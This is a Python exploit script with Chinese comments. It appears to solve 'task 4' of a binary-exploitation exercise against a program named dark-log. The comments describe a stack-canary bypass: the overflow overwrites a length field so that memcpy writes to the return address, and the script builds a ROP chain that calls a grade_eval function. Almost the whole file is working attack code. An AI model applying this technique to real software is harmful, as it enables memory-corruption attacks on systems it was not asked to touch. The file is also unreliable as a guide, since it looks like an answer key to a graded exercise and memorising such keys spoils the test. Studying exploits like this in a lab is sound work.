#!/usr/bin/env python3
# 任务4：dark-log 有 canary，不能直接覆盖返回地址。
# 这里不去碰 canary，而是改 f.len 让 memcpy 把数据写到 rbp+8
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


def p32(x):
    return struct.pack("<I", x)


# f.len 在 rbp-0x20，距离表达式开头 0x100；canary 在 rbp-0x8，也就是 0x118。
# 所以只要写到 0x104 就够改 len 了，canary 还是原来的值，检查能过。
# logMsg 在 rbp-0xa0，len 取 0xa8 时目标正好是 rbp+8（返回地址）。
chain = p64(0x4018a3)          # pop rdi ; ret
chain += p64(4)
chain += p64(0x4018a4)         # ret，对齐用
chain += p64(0x401677)         # grade_eval
chain += p64(0)

p = chain + b"\x90" * (0x100 - len(chain))
p += p32(0xa8)
sys.stdout.buffer.write(p)
